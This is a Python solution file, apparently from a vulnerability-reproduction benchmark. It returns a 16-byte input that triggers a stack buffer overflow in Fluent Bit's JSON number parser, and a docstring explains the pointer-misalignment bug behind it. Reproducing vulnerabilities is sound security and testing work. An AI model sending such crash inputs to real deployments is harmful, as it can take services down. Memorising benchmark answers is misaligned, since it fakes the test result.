import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability corresponds to oss-fuzz:42534949 in Fluent Bit (flb_json.c).
        A leading minus sign advances the parsing pointer. If the subsequent text matches 
        "infinity" imperfectly or not at all, the parser proceeds to parse a number 
        with the advanced pointer. This misalignment causes a stack buffer overflow 
        when copying the number into a fixed-size stack buffer (typically 16 bytes).
        
        To trigger the overflow on a 16-byte buffer with an off-by-one or length mismatch:
        We need a string of length 16 (matching the ground truth).
        Structure: '-' followed by 15 digits.
        We use '-1' followed by zeros to ensure it parses as a valid numeric sequence 
        (avoiding leading zero restrictions).
        """
        # Ground-truth length is 16 bytes.
        # Payload: "-" (1 byte) + "1" (1 byte) + "0" * 14 (14 bytes) = 16 bytes
        return b'-1' + b'0' * 14
